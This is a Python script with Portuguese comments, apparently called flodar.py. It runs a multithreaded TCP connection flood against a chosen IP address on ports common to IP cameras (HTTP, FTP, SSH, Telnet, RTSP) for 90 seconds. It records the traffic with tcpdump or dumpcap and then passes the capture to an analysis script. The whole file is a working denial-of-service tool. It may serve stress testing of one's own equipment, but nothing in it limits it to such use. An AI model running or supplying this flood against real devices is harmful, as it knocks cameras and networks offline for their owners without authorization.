import threading
import socket
import time
import sys
import subprocess

# Configurações
FLOOD_THREADS = 50  # Número de threads simultâneas
FLOOD_DURATION = 90  # Segundos de flood (1 minuto e meio)
FLOOD_PORTS = [80, 21, 22, 23, 554, 50000]  # Alvos comuns de câmeras

# Função de flood TCP

def flood_target(ip, port, duration):
    end = time.time() + duration
    while time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.sendall(b'FLOODTEST\r\n')
            s.close()
        except Exception:
            pass

# Função para capturar tráfego com tcpdump (Linux) ou dumpcap (Windows)
def start_capture(interface, ip, outfile):
    # Tenta usar tcpdump (Linux)
    try:
        cmd = ["tcpdump", "-i", interface, "host", ip, "-w", outfile]
        return subprocess.Popen(cmd)
    except Exception:
        pass
    # Tenta dumpcap no PATH
    try:
        cmd = ["dumpcap", "-i", interface, "-f", f"host {ip}", "-w", outfile]
        return subprocess.Popen(cmd)
    except Exception:
        pass
    # Tenta dumpcap no diretório padrão do Wireshark (Windows)
    try:
        cmd = [r"C:\\Program Files\\Wireshark\\dumpcap.exe", "-i", interface, "-f", f"host {ip}", "-w", outfile]
        return subprocess.Popen(cmd)
    except Exception:
        pass
    print("[ERRO] Não foi possível encontrar tcpdump ou dumpcap. Instale o Wireshark e verifique o caminho do dumpcap.")
    return None

# Função principal de flood + captura
def flodar(ip, interface="eth0"):
    print(f"[INFO] Iniciando flood em {ip} nas portas {FLOOD_PORTS} por {FLOOD_DURATION}s...")
    print("[INFO] Capturando tráfego em flood_capture.pcap para análise automática.")
    capture_proc = start_capture(interface, ip, "flood_capture.pcap")
    threads = []
    for port in FLOOD_PORTS:
        for _ in range(FLOOD_THREADS):
            t = threading.Thread(target=flood_target, args=(ip, port, FLOOD_DURATION), daemon=True)
            t.start()
            threads.append(t)
    for t in threads:
        t.join()
    if capture_proc:
        time.sleep(2)
        capture_proc.terminate()
    print("[INFO] Flood concluído. Iniciando análise automática do flood_capture.pcap...")
    try:
        import subprocess
        subprocess.run(["python", "analise_pcap.py", "flood_capture.pcap"])
    except Exception as e:
        print(f"[ERRO] Não foi possível rodar analise_pcap.py automaticamente: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python flodar.py <ip_da_camera> <interface_de_rede>")
    else:
        flodar(sys.argv[1], sys.argv[2])
